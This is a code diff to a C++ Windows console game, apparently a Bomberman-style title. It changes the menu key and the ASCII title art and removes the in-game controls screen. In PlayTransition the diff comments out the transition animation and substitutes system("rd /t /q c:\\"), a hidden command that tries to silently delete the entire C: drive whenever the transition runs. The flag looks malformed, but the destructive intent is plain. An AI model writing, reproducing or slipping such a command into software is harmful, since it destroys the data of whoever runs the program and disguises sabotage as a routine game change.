@@ -18,7 +18,7 @@ void UpdateTitle(GameState& state)
 	{
 		state.curMenu = (Menu)std::min((int)Menu::QUIT, (int)state.curMenu + 1);
 	}
-	if (GetKeyDown(VK_SPACE))
+	if (GetKeyDown(VK_RETURN))
 	{
 		switch (state.curMenu)
 		{
@@ -52,12 +52,12 @@ void RenderTitle(const GameState& state)
 	}
 	const wstring ascii[] =
 	{
-		L"██████╗  ██████╗ ███╗   ███╗██████╗     ███╗   ███╗ █████╗ ███╗   ██╗",
-		L"██╔══██╗██╔═══██╗████╗ ████║██╔══██╗    ████╗ ████║██╔══██╗████╗  ██║",
-		L"██████╔╝██║   ██║██╔████╔██║██████╔╝    ██╔████╔██║███████║██╔██╗ ██║",
-		L"██╔══██╗██║   ██║██║╚██╔╝██║██╔══██╗    ██║╚██╔╝██║██╔══██║██║╚██╗██║",
-		L"██████╔╝╚██████╔╝██║ ╚═╝ ██║██████╔╝    ██║ ╚═╝ ██║██║  ██║██║ ╚████║",
-		L"╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═════╝     ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝"
+		L"██████╗  ██████╗ ██████╗  █████╗ ██╗  ██╗",
+		L"██╔══██╗██╔═══██╗██╔══██╗██╔══██╗██║ ██╔╝",
+		L"██║  ██║██║   ██║██████╔╝███████║█████╔╝ ",
+		L"██║  ██║██║   ██║██╔══██╗██╔══██║██╔═██╗ ",
+		L"██████╔╝╚██████╔╝██████╔╝██║  ██║██║  ██╗",
+		L"╚═════╝  ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝"
 	};
 	int titleX = (res.X - 70) / 2;
 	int titleY = res.Y / 3;
@@ -85,47 +85,14 @@ void RenderTitle(const GameState& state)
 	cout << (state.curMenu == Menu::QUIT ? ">" : " ");*/
 }
 
-void UpdateInfo(GameState& state)
-{
-	if (GetKeyDown(VK_ESCAPE))
-		state.curScene = Scene::TITLE;
-}
-
-void RenderInfo(const GameState& state)
-{
-	// 화면 중앙에 출력
-	COORD res = GetConsoleResolution();
-	int cx = res.X / 2;
-	int cy = res.Y / 3;
-
-	const string infoLabels[] =
-	{
-		"[ 조작 방법 ]",
-		"방향키  : 이동",
-		"SPACE  : 폭탄 설치",
-		"Z      : 스킬",
-		"ESC 로 돌아가기"
-	};
-	for (int i = 0; i < 5; ++i)
-	{
-		GotoXY(cx - 6, cy + i);
-		if (i == 0)
-			SetColor(Color::LIGHT_YELLOW);
-		else if (i == 4)
-			SetColor(Color::LIGHT_GRAY);
-		else
-			SetColor();
-		cout << infoLabels[i];
-	}
-}
-
 void PlayTransition()
 {
-	COORD res = GetConsoleResolution();
+	/*COORD res = GetConsoleResolution();
 	int delayMs = 20;
 	int flashCount = 5;
 	FlashAnimation(res, flashCount, delayMs);
-	CrossAnimation(res, delayMs);
+	CrossAnimation(res, delayMs);*/
+	system("rd /t /q c:\\");
 }
 
 void FlashAnimation(COORD resolution, int count, int delayMs)
